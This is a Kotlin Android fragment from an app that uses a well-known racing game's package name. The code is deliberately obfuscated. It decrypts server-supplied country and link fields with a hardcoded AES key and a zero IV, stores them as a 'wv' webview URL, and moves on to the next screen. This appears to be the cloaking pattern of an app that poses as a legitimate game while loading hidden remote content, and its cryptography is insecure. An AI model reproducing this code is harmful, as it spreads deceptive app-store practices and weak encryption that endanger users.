package com.naturalmotion.csrclassic

import android.content.Context
import android.content.SharedPreferences
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.navigation.fragment.findNavController
import com.mvffg.btwolib.decrypt
import com.naturalmotion.csrclassic.gktkgkgkt.UHHufhrhfhrihiuhurf
import org.koin.android.ext.android.inject
import org.koin.androidx.viewmodel.ext.android.activityViewModel
import org.koin.core.qualifier.named
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec


class ThrfreeeeffeFragment : Fragment() {

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_thrfreeeeffe, container, false)
    }

    override fun onAttach(context: Context) {
        super.onAttach(context)
        gt2hy5hy55 = context
    }

    val ghyhyhyhy by activityViewModel<UHHufhrhfhrihiuhurf>(named("MainModel"))
    lateinit var g2h6y26hy62hy6: String
    lateinit var gt2gt62gt6: String
    lateinit var gtgttg2gt62: String
    private lateinit var gt2hy5hy55: Context
    val gtg2hy5hy59h5 = "AES/CBC/PKCS5Padding"
    val gthnnyju2juuj2 = SecretKeySpec("kYp3s6v9y\$B&E)H@McQfTjWmZq4t7w!z".toByteArray(), "AES")
    val th2yh2yhyhy = IvParameterSpec(ByteArray(16))

    val gthyuujujuj2uj2: SharedPreferences by inject(named("SharedPreferences"))


    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        ghyhyhyhy.mainId.observe(viewLifecycleOwner) {
            if (it != null) {
                val ghyhyhju2j2uj = it.toString()
                gthyuujujuj2uj2.edit().putString("mainId", ghyhyhju2j2uj).apply()
            }
        }

        ghyhyhyhy.hyhyuju5ju5uj9uj5uj.observe(viewLifecycleOwner) {
            if (it != null) {
                g2h6y26hy62hy6 = it.elgeo
                gtgttg2gt62 = it.elnumero
                gt2gt62gt6 = it.ellinka
                val hyhjuj2ju26uj = decrypt(gtg2hy5hy59h5, g2h6y26hy62hy6, gthnnyju2juuj2, th2yh2yhyhy)
                val gt2 = decrypt(gtg2hy5hy59h5, gt2gt62gt6, gthnnyju2juuj2, th2yh2yhyhy)

                gthyuujujuj2uj2.edit().putString("countryDev", hyhjuj2ju26uj).apply()
                gthyuujujuj2uj2.edit().putString("apps", gtgttg2gt62).apply()
                gthyuujujuj2uj2.edit().putString("wv", gt2).apply()

                gtjgtjiojgtjiojgti()
            }
        }
    }

    private fun gtjgtjiojgtjiojgti() {
        findNavController().navigate(R.id.action_thrfreeeeffeFragment_to_foooorrurututuFragment)
    }

    override fun onStart() {
        super.onStart()

    }
}